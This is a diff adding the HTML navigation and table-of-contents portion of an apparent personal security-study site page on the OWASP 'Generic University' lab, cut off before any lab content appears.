@@ -1,0 +1,2853 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../Malware_Analysis/Practical_Malware_Analysis/Chapter%203/">
+      
+      
+        <link rel="next" href="../crAPI/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.4.8">
+    
+    
+      
+        <title>Generic University - irboi746's space</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.4b4a2bd9.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.356b1318.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#generic-university" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="irboi746&#39;s space" class="md-header__button md-logo" aria-label="irboi746's space" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            irboi746's space
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Generic University
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="irboi746&#39;s space" class="md-nav__button md-logo" aria-label="irboi746's space" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    irboi746's space
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Burp Academy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Burp Academy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Apprentice
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Apprentice
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Access Control Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Authentication/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Business Logic Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSRF, Clickjacking and CORS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Cross%20Site%20Scripting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross Site Scripting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/DOM-based%20XSS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DOM based XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP Host Header Attacks & File Upload Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Information%20Disclosure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Information Disclosure
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/JWT/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JWT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Other%20Labs/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Other Labs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/SQL%20Injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/XXE%20and%20SSRF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE and SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Practitioner
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Practitioner
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection DB Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection UNION Attack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTF/TISC%202022%20%281%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSIT TISC 2022 (1)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTF/TISC%202022%20%282%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSIT TISC 2022 (2)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Flareon22
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Flareon22
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTF/Flareon22/FlareOn_22/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Flareon-22
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Dev
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Dev
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Java
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            Java
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Java/Burp%20Extension%20-%20GUI/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burp Extension - GUI
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Java/Burp%20Extension%20-%20Hello%20World/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burp Extension - Hello World
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Java/Burp%20Extension%20-%20README/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burp Extension   README
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Javascript
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Javascript
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Javascript/Node.js/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Node.js
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Javascript/Node.js_Projects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NodeJS Projects
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Python
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Python
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Python/Web%20Automation%20Cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Automation Cheatsheet
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Malware Analysis
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Malware Analysis
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Notes/File_Identification%26Classification/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Identification and Classification
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Notes/Introduction/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Introduction
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Obfuscation Techniques
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Practical Malware Analysis
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Practical Malware Analysis
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Practical_Malware_Analysis/Chapter%200/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 0
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Practical_Malware_Analysis/Chapter%201/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Practical_Malware_Analysis/Chapter%203/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 3
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    OWASP Labs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            OWASP Labs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Generic University
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Generic University
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#authors-goals" class="md-nav__link">
+    Author's Goals
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2a-mapping-application-content" class="md-nav__link">
+    2a. Mapping Application Content
+  </a>
+  
+    <nav class="md-nav" aria-label="2a. Mapping Application Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#explore-visible-content" class="md-nav__link">
+    Explore Visible Content
+  </a>
+  
+    <nav class="md-nav" aria-label="Explore Visible Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-exploration" class="md-nav__link">
+    Initial Exploration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#further-exploration" class="md-nav__link">
+    Further Exploration
+  </a>
+  
+    <nav class="md-nav" aria-label="Further Exploration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#registering-an-account" class="md-nav__link">
+    Registering an account
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploring-with-a-registered-account" class="md-nav__link">
+    Exploring with a Registered Account
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#consult-public-resources" class="md-nav__link">
+    Consult Public Resources
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-hidden-content" class="md-nav__link">
+    Discover Hidden Content
+  </a>
+  
+    <nav class="md-nav" aria-label="Discover Hidden Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-discovery" class="md-nav__link">
+    Initial Discovery
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Discovery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-commontxt" class="md-nav__link">
+    Using common.txt
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
